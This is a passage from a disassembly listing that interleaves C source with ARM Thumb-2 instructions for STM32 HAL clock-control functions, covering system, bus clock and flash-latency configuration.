 8004234:	d901      	bls.n	800423a <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 8004236:	2303      	movs	r3, #3
 8004238:	e06e      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800423a:	4b3a      	ldr	r3, [pc, #232]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 800423c:	689b      	ldr	r3, [r3, #8]
 800423e:	f003 020c 	and.w	r2, r3, #12
 8004242:	687b      	ldr	r3, [r7, #4]
 8004244:	685b      	ldr	r3, [r3, #4]
 8004246:	009b      	lsls	r3, r3, #2
 8004248:	429a      	cmp	r2, r3
 800424a:	d1eb      	bne.n	8004224 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 800424c:	687b      	ldr	r3, [r7, #4]
 800424e:	681b      	ldr	r3, [r3, #0]
 8004250:	f003 0302 	and.w	r3, r3, #2
 8004254:	2b00      	cmp	r3, #0
 8004256:	d010      	beq.n	800427a <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004258:	687b      	ldr	r3, [r7, #4]
 800425a:	689a      	ldr	r2, [r3, #8]
 800425c:	4b31      	ldr	r3, [pc, #196]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 800425e:	689b      	ldr	r3, [r3, #8]
 8004260:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004264:	429a      	cmp	r2, r3
 8004266:	d208      	bcs.n	800427a <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004268:	4b2e      	ldr	r3, [pc, #184]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 800426a:	689b      	ldr	r3, [r3, #8]
 800426c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004270:	687b      	ldr	r3, [r7, #4]
 8004272:	689b      	ldr	r3, [r3, #8]
 8004274:	492b      	ldr	r1, [pc, #172]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 8004276:	4313      	orrs	r3, r2
 8004278:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 800427a:	4b29      	ldr	r3, [pc, #164]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 800427c:	681b      	ldr	r3, [r3, #0]
 800427e:	f003 0307 	and.w	r3, r3, #7
 8004282:	683a      	ldr	r2, [r7, #0]
 8004284:	429a      	cmp	r2, r3
 8004286:	d210      	bcs.n	80042aa <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004288:	4b25      	ldr	r3, [pc, #148]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 800428a:	681b      	ldr	r3, [r3, #0]
 800428c:	f023 0207 	bic.w	r2, r3, #7
 8004290:	4923      	ldr	r1, [pc, #140]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 8004292:	683b      	ldr	r3, [r7, #0]
 8004294:	4313      	orrs	r3, r2
 8004296:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004298:	4b21      	ldr	r3, [pc, #132]	; (8004320 <HAL_RCC_ClockConfig+0x1ec>)
 800429a:	681b      	ldr	r3, [r3, #0]
 800429c:	f003 0307 	and.w	r3, r3, #7
 80042a0:	683a      	ldr	r2, [r7, #0]
 80042a2:	429a      	cmp	r2, r3
 80042a4:	d001      	beq.n	80042aa <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 80042a6:	2301      	movs	r3, #1
 80042a8:	e036      	b.n	8004318 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 80042aa:	687b      	ldr	r3, [r7, #4]
 80042ac:	681b      	ldr	r3, [r3, #0]
 80042ae:	f003 0304 	and.w	r3, r3, #4
 80042b2:	2b00      	cmp	r3, #0
 80042b4:	d008      	beq.n	80042c8 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 80042b6:	4b1b      	ldr	r3, [pc, #108]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80042b8:	689b      	ldr	r3, [r3, #8]
 80042ba:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 80042be:	687b      	ldr	r3, [r7, #4]
 80042c0:	68db      	ldr	r3, [r3, #12]
 80042c2:	4918      	ldr	r1, [pc, #96]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80042c4:	4313      	orrs	r3, r2
 80042c6:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 80042c8:	687b      	ldr	r3, [r7, #4]
 80042ca:	681b      	ldr	r3, [r3, #0]
 80042cc:	f003 0308 	and.w	r3, r3, #8
 80042d0:	2b00      	cmp	r3, #0
 80042d2:	d009      	beq.n	80042e8 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 80042d4:	4b13      	ldr	r3, [pc, #76]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80042d6:	689b      	ldr	r3, [r3, #8]
 80042d8:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 80042dc:	687b      	ldr	r3, [r7, #4]
 80042de:	691b      	ldr	r3, [r3, #16]
 80042e0:	00db      	lsls	r3, r3, #3
 80042e2:	4910      	ldr	r1, [pc, #64]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80042e4:	4313      	orrs	r3, r2
 80042e6:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80042e8:	f000 f824 	bl	8004334 <HAL_RCC_GetSysClockFreq>
 80042ec:	4602      	mov	r2, r0
 80042ee:	4b0d      	ldr	r3, [pc, #52]	; (8004324 <HAL_RCC_ClockConfig+0x1f0>)
 80042f0:	689b      	ldr	r3, [r3, #8]
 80042f2:	091b      	lsrs	r3, r3, #4
 80042f4:	f003 030f 	and.w	r3, r3, #15
 80042f8:	490b      	ldr	r1, [pc, #44]	; (8004328 <HAL_RCC_ClockConfig+0x1f4>)
 80042fa:	5ccb      	ldrb	r3, [r1, r3]
 80042fc:	f003 031f 	and.w	r3, r3, #31
 8004300:	fa22 f303 	lsr.w	r3, r2, r3
 8004304:	4a09      	ldr	r2, [pc, #36]	; (800432c <HAL_RCC_ClockConfig+0x1f8>)
 8004306:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 8004308:	4b09      	ldr	r3, [pc, #36]	; (8004330 <HAL_RCC_ClockConfig+0x1fc>)
 800430a:	681b      	ldr	r3, [r3, #0]
 800430c:	4618      	mov	r0, r3
 800430e:	f7fc ff29 	bl	8001164 <HAL_InitTick>
 8004312:	4603      	mov	r3, r0
 8004314:	72fb      	strb	r3, [r7, #11]

  return status;
 8004316:	7afb      	ldrb	r3, [r7, #11]
}
 8004318:	4618      	mov	r0, r3
 800431a:	3710      	adds	r7, #16
 800431c:	46bd      	mov	sp, r7
 800431e:	bd80      	pop	{r7, pc}
 8004320:	40022000 	.word	0x40022000
 8004324:	40021000 	.word	0x40021000
 8004328:	0800d278 	.word	0x0800d278
 800432c:	20000000 	.word	0x20000000
 8004330:	20000004 	.word	0x20000004

08004334 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 8004334:	b480      	push	{r7}
 8004336:	b089      	sub	sp, #36	; 0x24
 8004338:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 800433a:	2300      	movs	r3, #0
 800433c:	61fb      	str	r3, [r7, #28]
 800433e:	2300      	movs	r3, #0
 8004340:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8004342:	4b3e      	ldr	r3, [pc, #248]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 8004344:	689b      	ldr	r3, [r3, #8]
 8004346:	f003 030c 	and.w	r3, r3, #12
 800434a:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 800434c:	4b3b      	ldr	r3, [pc, #236]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 800434e:	68db      	ldr	r3, [r3, #12]
 8004350:	f003 0303 	and.w	r3, r3, #3
 8004354:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8004356:	693b      	ldr	r3, [r7, #16]
 8004358:	2b00      	cmp	r3, #0
 800435a:	d005      	beq.n	8004368 <HAL_RCC_GetSysClockFreq+0x34>
 800435c:	693b      	ldr	r3, [r7, #16]
 800435e:	2b0c      	cmp	r3, #12
 8004360:	d121      	bne.n	80043a6 <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004362:	68fb      	ldr	r3, [r7, #12]
 8004364:	2b01      	cmp	r3, #1
 8004366:	d11e      	bne.n	80043a6 <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 8004368:	4b34      	ldr	r3, [pc, #208]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 800436a:	681b      	ldr	r3, [r3, #0]
 800436c:	f003 0308 	and.w	r3, r3, #8
 8004370:	2b00      	cmp	r3, #0
 8004372:	d107      	bne.n	8004384 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004374:	4b31      	ldr	r3, [pc, #196]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 8004376:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 800437a:	0a1b      	lsrs	r3, r3, #8
 800437c:	f003 030f 	and.w	r3, r3, #15
 8004380:	61fb      	str	r3, [r7, #28]
 8004382:	e005      	b.n	8004390 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004384:	4b2d      	ldr	r3, [pc, #180]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 8004386:	681b      	ldr	r3, [r3, #0]
 8004388:	091b      	lsrs	r3, r3, #4
 800438a:	f003 030f 	and.w	r3, r3, #15
 800438e:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004390:	4a2b      	ldr	r2, [pc, #172]	; (8004440 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004392:	69fb      	ldr	r3, [r7, #28]
 8004394:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004398:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800439a:	693b      	ldr	r3, [r7, #16]
 800439c:	2b00      	cmp	r3, #0
 800439e:	d10d      	bne.n	80043bc <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 80043a0:	69fb      	ldr	r3, [r7, #28]
 80043a2:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 80043a4:	e00a      	b.n	80043bc <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 80043a6:	693b      	ldr	r3, [r7, #16]
 80043a8:	2b04      	cmp	r3, #4
 80043aa:	d102      	bne.n	80043b2 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 80043ac:	4b25      	ldr	r3, [pc, #148]	; (8004444 <HAL_RCC_GetSysClockFreq+0x110>)
 80043ae:	61bb      	str	r3, [r7, #24]
 80043b0:	e004      	b.n	80043bc <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 80043b2:	693b      	ldr	r3, [r7, #16]
 80043b4:	2b08      	cmp	r3, #8
 80043b6:	d101      	bne.n	80043bc <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 80043b8:	4b23      	ldr	r3, [pc, #140]	; (8004448 <HAL_RCC_GetSysClockFreq+0x114>)
 80043ba:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 80043bc:	693b      	ldr	r3, [r7, #16]
 80043be:	2b0c      	cmp	r3, #12
 80043c0:	d134      	bne.n	800442c <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 80043c2:	4b1e      	ldr	r3, [pc, #120]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 80043c4:	68db      	ldr	r3, [r3, #12]
 80043c6:	f003 0303 	and.w	r3, r3, #3
 80043ca:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 80043cc:	68bb      	ldr	r3, [r7, #8]
 80043ce:	2b02      	cmp	r3, #2
 80043d0:	d003      	beq.n	80043da <HAL_RCC_GetSysClockFreq+0xa6>
 80043d2:	68bb      	ldr	r3, [r7, #8]
 80043d4:	2b03      	cmp	r3, #3
 80043d6:	d003      	beq.n	80043e0 <HAL_RCC_GetSysClockFreq+0xac>
 80043d8:	e005      	b.n	80043e6 <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 80043da:	4b1a      	ldr	r3, [pc, #104]	; (8004444 <HAL_RCC_GetSysClockFreq+0x110>)
 80043dc:	617b      	str	r3, [r7, #20]
      break;
 80043de:	e005      	b.n	80043ec <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 80043e0:	4b19      	ldr	r3, [pc, #100]	; (8004448 <HAL_RCC_GetSysClockFreq+0x114>)
 80043e2:	617b      	str	r3, [r7, #20]
      break;
 80043e4:	e002      	b.n	80043ec <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 80043e6:	69fb      	ldr	r3, [r7, #28]
 80043e8:	617b      	str	r3, [r7, #20]
      break;
 80043ea:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 80043ec:	4b13      	ldr	r3, [pc, #76]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 80043ee:	68db      	ldr	r3, [r3, #12]
 80043f0:	091b      	lsrs	r3, r3, #4
 80043f2:	f003 0307 	and.w	r3, r3, #7
 80043f6:	3301      	adds	r3, #1
 80043f8:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 80043fa:	4b10      	ldr	r3, [pc, #64]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 80043fc:	68db      	ldr	r3, [r3, #12]
 80043fe:	0a1b      	lsrs	r3, r3, #8
 8004400:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004404:	697a      	ldr	r2, [r7, #20]
 8004406:	fb03 f202 	mul.w	r2, r3, r2
 800440a:	687b      	ldr	r3, [r7, #4]
 800440c:	fbb2 f3f3 	udiv	r3, r2, r3
 8004410:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 8004412:	4b0a      	ldr	r3, [pc, #40]	; (800443c <HAL_RCC_GetSysClockFreq+0x108>)
 8004414:	68db      	ldr	r3, [r3, #12]
 8004416:	0e5b      	lsrs	r3, r3, #25
 8004418:	f003 0303 	and.w	r3, r3, #3
 800441c:	3301      	adds	r3, #1
 800441e:	005b      	lsls	r3, r3, #1
 8004420:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 8004422:	697a      	ldr	r2, [r7, #20]
 8004424:	683b      	ldr	r3, [r7, #0]
 8004426:	fbb2 f3f3 	udiv	r3, r2, r3
 800442a:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 800442c:	69bb      	ldr	r3, [r7, #24]
}
 800442e:	4618      	mov	r0, r3
 8004430:	3724      	adds	r7, #36	; 0x24
 8004432:	46bd      	mov	sp, r7
 8004434:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004438:	4770      	bx	lr
 800443a:	bf00      	nop
 800443c:	40021000 	.word	0x40021000
 8004440:	0800d290 	.word	0x0800d290
 8004444:	00f42400 	.word	0x00f42400
 8004448:	007a1200 	.word	0x007a1200

0800444c <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 800444c:	b480      	push	{r7}
 800444e:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 8004450:	4b03      	ldr	r3, [pc, #12]	; (8004460 <HAL_RCC_GetHCLKFreq+0x14>)
 8004452:	681b      	ldr	r3, [r3, #0]
}
 8004454:	4618      	mov	r0, r3
 8004456:	46bd      	mov	sp, r7
 8004458:	f85d 7b04 	ldr.w	r7, [sp], #4
 800445c:	4770      	bx	lr
 800445e:	bf00      	nop
 8004460:	20000000 	.word	0x20000000

08004464 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004464:	b580      	push	{r7, lr}
 8004466:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 8004468:	f7ff fff0 	bl	800444c <HAL_RCC_GetHCLKFreq>
 800446c:	4602      	mov	r2, r0
 800446e:	4b06      	ldr	r3, [pc, #24]	; (8004488 <HAL_RCC_GetPCLK1Freq+0x24>)
 8004470:	689b      	ldr	r3, [r3, #8]
 8004472:	0a1b      	lsrs	r3, r3, #8
 8004474:	f003 0307 	and.w	r3, r3, #7
 8004478:	4904      	ldr	r1, [pc, #16]	; (800448c <HAL_RCC_GetPCLK1Freq+0x28>)
 800447a:	5ccb      	ldrb	r3, [r1, r3]
 800447c:	f003 031f 	and.w	r3, r3, #31
 8004480:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004484:	4618      	mov	r0, r3
 8004486:	bd80      	pop	{r7, pc}
 8004488:	40021000 	.word	0x40021000
 800448c:	0800d288 	.word	0x0800d288

08004490 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004490:	b580      	push	{r7, lr}
 8004492:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004494:	f7ff ffda 	bl	800444c <HAL_RCC_GetHCLKFreq>
 8004498:	4602      	mov	r2, r0
 800449a:	4b06      	ldr	r3, [pc, #24]	; (80044b4 <HAL_RCC_GetPCLK2Freq+0x24>)
 800449c:	689b      	ldr	r3, [r3, #8]
 800449e:	0adb      	lsrs	r3, r3, #11
 80044a0:	f003 0307 	and.w	r3, r3, #7
 80044a4:	4904      	ldr	r1, [pc, #16]	; (80044b8 <HAL_RCC_GetPCLK2Freq+0x28>)
 80044a6:	5ccb      	ldrb	r3, [r1, r3]
 80044a8:	f003 031f 	and.w	r3, r3, #31
 80044ac:	fa22 f303 	lsr.w	r3, r2, r3
}
 80044b0:	4618      	mov	r0, r3
 80044b2:	bd80      	pop	{r7, pc}
 80044b4:	40021000 	.word	0x40021000
 80044b8:	0800d288 	.word	0x0800d288

080044bc <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 80044bc:	b580      	push	{r7, lr}
 80044be:	b086      	sub	sp, #24
 80044c0:	af00      	add	r7, sp, #0
 80044c2:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 80044c4:	2300      	movs	r3, #0
 80044c6:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 80044c8:	4b2a      	ldr	r3, [pc, #168]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044ca:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044cc:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80044d0:	2b00      	cmp	r3, #0
 80044d2:	d003      	beq.n	80044dc <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 80044d4:	f7ff f9a6 	bl	8003824 <HAL_PWREx_GetVoltageRange>
 80044d8:	6178      	str	r0, [r7, #20]
 80044da:	e014      	b.n	8004506 <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 80044dc:	4b25      	ldr	r3, [pc, #148]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044de:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044e0:	4a24      	ldr	r2, [pc, #144]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044e2:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80044e6:	6593      	str	r3, [r2, #88]	; 0x58
 80044e8:	4b22      	ldr	r3, [pc, #136]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044ea:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044ec:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80044f0:	60fb      	str	r3, [r7, #12]
 80044f2:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 80044f4:	f7ff f996 	bl	8003824 <HAL_PWREx_GetVoltageRange>
 80044f8:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 80044fa:	4b1e      	ldr	r3, [pc, #120]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044fc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044fe:	4a1d      	ldr	r2, [pc, #116]	; (8004574 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004500:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004504:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 8004506:	697b      	ldr	r3, [r7, #20]
 8004508:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 800450c:	d10b      	bne.n	8004526 <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 800450e:	687b      	ldr	r3, [r7, #4]
 8004510:	2b80      	cmp	r3, #128	; 0x80
 8004512:	d919      	bls.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004514:	687b      	ldr	r3, [r7, #4]
 8004516:	2ba0      	cmp	r3, #160	; 0xa0
 8004518:	d902      	bls.n	8004520 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800451a:	2302      	movs	r3, #2
 800451c:	613b      	str	r3, [r7, #16]
 800451e:	e013      	b.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004520:	2301      	movs	r3, #1
 8004522:	613b      	str	r3, [r7, #16]
 8004524:	e010      	b.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 8004526:	687b      	ldr	r3, [r7, #4]
 8004528:	2b80      	cmp	r3, #128	; 0x80
 800452a:	d902      	bls.n	8004532 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 800452c:	2303      	movs	r3, #3
 800452e:	613b      	str	r3, [r7, #16]
 8004530:	e00a      	b.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 8004532:	687b      	ldr	r3, [r7, #4]
 8004534:	2b80      	cmp	r3, #128	; 0x80
 8004536:	d102      	bne.n	800453e <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004538:	2302      	movs	r3, #2
 800453a:	613b      	str	r3, [r7, #16]
 800453c:	e004      	b.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 800453e:	687b      	ldr	r3, [r7, #4]
 8004540:	2b70      	cmp	r3, #112	; 0x70
 8004542:	d101      	bne.n	8004548 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004544:	2301      	movs	r3, #1
 8004546:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 8004548:	4b0b      	ldr	r3, [pc, #44]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800454a:	681b      	ldr	r3, [r3, #0]
 800454c:	f023 0207 	bic.w	r2, r3, #7
 8004550:	4909      	ldr	r1, [pc, #36]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004552:	693b      	ldr	r3, [r7, #16]
 8004554:	4313      	orrs	r3, r2
 8004556:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 8004558:	4b07      	ldr	r3, [pc, #28]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800455a:	681b      	ldr	r3, [r3, #0]
 800455c:	f003 0307 	and.w	r3, r3, #7
 8004560:	693a      	ldr	r2, [r7, #16]
 8004562:	429a      	cmp	r2, r3
 8004564:	d001      	beq.n	800456a <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
